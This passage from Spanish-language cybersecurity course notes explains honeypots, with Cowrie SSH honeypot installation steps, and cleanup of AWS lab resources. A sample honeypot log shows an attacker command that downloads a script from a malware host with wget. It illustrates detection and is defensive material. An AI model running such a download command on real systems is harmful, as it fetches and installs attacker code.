### ✅ Conclusión

Comprender CVE, CVSS y CPE te permite:

- Priorizar parches de seguridad.
- Identificar si tu sistema es vulnerable.
- Automatizar alertas en un SIEM o herramienta de gestión de vulnerabilidades.

---

[🔼](#índice)

---

## **562. Honeypot**

### 🧠 ¿Qué es un Honeypot?

Un **honeypot** (en español: “tarro de miel”) es un **sistema trampa** diseñado para **atraer a los atacantes** y así:

- Detectar ataques reales.
- Estudiar técnicas de los atacantes.
- Ganar tiempo para proteger sistemas reales.
- Simular vulnerabilidades que no afectan a tu sistema real.

> 👉 Imagina dejar una billetera falsa en la calle con una cámara escondida. No quieres que te roben, sino observar cómo actúa el ladrón.

---

### 🧱 Tipos de Honeypot

| Tipo                 | Descripción                                                            |
| -------------------- | ---------------------------------------------------------------------- |
| **Low Interaction**  | Simula servicios superficiales (puertos abiertos, respuestas simples). |
| **High Interaction** | Es un sistema real vulnerable que permite al atacante interactuar más. |
| **Research**         | Usado para estudiar amenazas complejas y APTs.                         |
| **Production**       | Protege redes reales actuando como cebo.                               |

---

### 🎯 ¿Para qué sirve?

- Detectar escaneos, ataques y malware.
- Ver qué IPs intentan conectarse a tus servicios.
- Entender qué tipo de amenazas enfrenta tu red.

---

### 🔧 ¿Cómo se instala?

#### Opción sencilla: **Cowrie** (honeypot SSH/Telnet)

Es uno de los honeypots más conocidos, de **baja-interacción**, ideal para pruebas.

---

### 🐧 Instalación paso a paso (Ubuntu o Kali Linux)

> Vamos a instalar **Cowrie**, que simula un sistema Linux vulnerable por SSH.

#### ✅ Requisitos previos:

- Tener Python3 y Git
- Tener privilegios `sudo`
- Tener un puerto libre (por defecto Cowrie escucha en 2222)

---

#### 🧪 Paso 1: Instalar dependencias

```bash
sudo apt update
sudo apt install git python3-venv python3-dev libssl-dev libffi-dev build-essential libpython3-dev -y
```

---

#### 🧪 Paso 2: Clonar Cowrie

```bash
git clone https://github.com/cowrie/cowrie.git
cd cowrie
```

---

#### 🧪 Paso 3: Crear entorno virtual

```bash
python3 -m venv cowrie-env
source cowrie-env/bin/activate
```

---

#### 🧪 Paso 4: Instalar dependencias de Cowrie

```bash
pip install --upgrade pip
pip install -r requirements.txt
```

---

#### 🧪 Paso 5: Copiar el archivo de configuración

```bash
cp etc/cowrie.cfg.dist etc/cowrie.cfg
```

---

#### 🧪 Paso 6: Ejecutar Cowrie

```bash
bin/cowrie start
```

Verifica que se está ejecutando:

```bash
bin/cowrie status
```

Cowrie escucha en el puerto **2222** por defecto (simulando un SSH vulnerable).

---

#### 🧪 Paso 7: Ver logs de intentos

```bash
tail -f log/cowrie.log
```

---

### 🧾 Ejemplo completo y real

#### 🧪 Escenario

Gustavo instala Cowrie en una VM expuesta a internet (con un puerto 2222 abierto en el router/firewall). Luego, empieza a ver cosas como:

```
New connection: 167.99.51.12
Login attempt [root:123456]
Login attempt [admin:admin]
Command issued: wget http://malware.ru/bad.sh
```

Esto significa que **un bot** o **atacante real** encontró tu honeypot y está tratando de entrar con contraseñas comunes.

---

#### 📊 Resultado

Con Cowrie puedes:

- Ver intentos de ataque SSH reales.
- Ver comandos que ejecutan.
- Detectar bots que intentan propagar malware.
- Integrarlo a un SIEM (como Splunk o Wazuh) para alertas.

---

### 💡 Recomendaciones

- **Nunca** instales un honeypot en una máquina que contenga datos reales importantes.
- Usa máquinas virtuales o entornos aislados (por ejemplo, una VM en VirtualBox o una nube segura).
- Puedes enviar los datos recolectados a una base de datos o a herramientas como **ELK**, **Splunk** o **TheHive** para análisis avanzado.

---

### 🧩 Bonus: Otros honeypots que puedes probar

| Honeypot    | Descripción                                  | Lenguaje |
| ----------- | -------------------------------------------- | -------- |
| **Dionaea** | Atrae malware como gusanos y exploits        | Python   |
| **Honeyd**  | Emula sistemas operativos enteros            | C        |
| **T-Pot**   | Distribución con muchos honeypots integrados | Varios   |
| **Snort**   | IDS pero puede usarse como trampa            | C        |

---

### 📚 Conclusión

| Elemento       | Descripción                                        |
| -------------- | -------------------------------------------------- |
| Qué es         | Un sistema trampa para atraer atacantes            |
| Para qué sirve | Detección temprana, estudio de ataques             |
| Cómo instalar  | Con Cowrie (Python), rápido y eficaz               |
| Ejemplo real   | Ataques SSH detectados por Cowrie + logs guardados |

---

[🔼](#índice)

---

## **563. Elimina los recursos de AW**

### 🧠 ¿Qué significa "Eliminar los recursos de AWS"?

Cuando usas servicios en **Amazon Web Services (AWS)**, estás creando **recursos en la nube**, como:

- Máquinas virtuales (EC2)
- Bases de datos (RDS, DynamoDB)
- Buckets de almacenamiento (S3)
- Reglas de red (VPC, security groups)
- Lambdas, roles IAM, API Gateways, etc.

**Eliminar los recursos** significa **detener, borrar o desactivar esos servicios** para:

- **Evitar cobros innecesarios** 💸
- **Cerrar accesos a la nube**
- **Proteger datos sensibles**
- **Evitar errores de configuración persistentes**

---

### ⚠️ ¿Por qué es importante?

AWS **cobra por minuto o por uso**. Si dejas un EC2 o RDS encendido, seguirás pagando aunque no lo uses. Por eso, cuando termines un laboratorio o proyecto:

> ✂️ **Debes eliminar todos los recursos para evitar facturación innecesaria.**

---

### 🧹 ¿Qué recursos debo eliminar?

| Servicio   | Qué eliminar o detener                      |
| ---------- | ------------------------------------------- |
| EC2        | Instancias, volúmenes, snapshots, key pairs |
| S3         | Buckets (vaciar antes), versiones, objetos  |
| RDS        | Instancias, backups automáticos             |
| IAM        | Usuarios, roles, policies                   |
| Lambda     | Funciones, triggers                         |
| VPC        | Redes, subredes, gateways                   |
| CloudWatch | Alarmas, logs, dashboards                   |

---

### 🧪 ¿Cómo eliminar recursos paso a paso?

#### 🔧 Opción 1: Desde la **Consola Web de AWS**

##### Paso 1: Inicia sesión en AWS

👉 Ve a [https://aws.amazon.com](https://aws.amazon.com) y accede a la consola.

##### Paso 2: Recorre los servicios usados

En el buscador de la parte superior, escribe por ejemplo `EC2`, `S3`, `IAM`, `RDS`, etc.

##### Paso 3: Detén y elimina recursos

Ejemplo con EC2:

- Detén la instancia si está corriendo.
- Luego, selecciona la instancia y haz clic en “**Actions > Instance State > Terminate**”.

Ejemplo con S3:

- Entra al bucket.
- Elimina primero los **archivos** y luego el bucket.

---

#### 🔧 Opción 2: Desde la terminal (CLI de AWS)

##### Requisitos:

- Tener instalado AWS CLI
- Tener configuradas tus credenciales (`aws configure`)

##### Ejemplo: Terminar una instancia EC2

```bash
aws ec2 describe-instances
```

Busca el `InstanceId` y luego ejecútalo:

```bash
aws ec2 terminate-instances --instance-ids i-0123456789abcdef0
```

##### Ejemplo: Eliminar un bucket S3 (y su contenido)

```bash
aws s3 rb s3://mi-bucket --force
```

---

### 🧾 Ejemplo completo: Eliminar un laboratorio de ciberseguridad en AWS

#### 🔎 Escenario

Gustavo creó este laboratorio:

- Una instancia EC2 con Kali Linux
- Un bucket S3 para logs
- Una base RDS de prueba
- Una función Lambda para automatizar tareas

#### ✅ Pasos para limpiar todo:

1. **EC2**

   - Ir a EC2 → Instances → `Terminate` la instancia.
   - Ir a Volumes → Eliminar EBS no usados.
   - Ir a Key Pairs → Eliminar llaves creadas.

2. **S3**

   - Ir a S3 → Entrar al bucket → Vaciar → Eliminar.

3. **RDS**

   - Ir a RDS → Eliminar instancias.
   - Marcar que no quieres backups.

4. **Lambda**

   - Ir a Lambda → Seleccionar función → `Delete`.

5. **IAM**

   - Ir a IAM → Eliminar usuarios, roles o policies creadas.

6. **CloudWatch / Logs**

   - Ir a CloudWatch → Eliminar alarmas, grupos de logs.

7. **VPC**

   - Ir a VPC → Revisar subredes, Internet Gateway y eliminar si no son por defecto.

---

### ✅ Verificación final: ¿Quedan recursos?

AWS tiene una herramienta llamada **"Resource Groups"** o el panel **“Billing”** donde puedes ver:

- Qué servicios están activos.
- Si hay algún recurso facturable aún corriendo.

También puedes ejecutar en consola:

```bash
aws resourcegroupstaggingapi get-resources
```

---

### 🧼 Recomendaciones Finales

- 🧠 **Etiqueta tus recursos** cuando los crees para encontrarlos rápido.
- 📊 Revisa el **Billing Dashboard** de vez en cuando.
- 🧯 Siempre elimina **snapshots y backups** si no los necesitas.
- 💳 Considera **activar alertas de presupuesto** en AWS Budgets.

---

### 📚 Conclusión

| Concepto        | Detalles fáciles de recordar                           |
| --------------- | ------------------------------------------------------ |
| Qué es          | Eliminar instancias, S3, RDS, Lambda, etc. al terminar |
| Por qué hacerlo | Para no pagar por servicios que ya no usas             |
| Cómo hacerlo    | Desde la consola o CLI, siguiendo pasos organizados    |
| Ejemplo real    | EC2 + S3 + RDS + Lambda eliminados tras laboratorio    |

---

[🔼](#índice)

---

| **Inicio**         | **atrás 6**                                                                        | **Siguiente 8**                                                                         |
| ------------------ | ---------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./6_6_Ciberseguridad_y_Hardening_de_Sistemas_Operativos_Endpoint_Security.md) | [⏩](./6_8_Firma_digital_Certificado_digital_y_PKI_Infraestructura_de_clave_publica.md) |
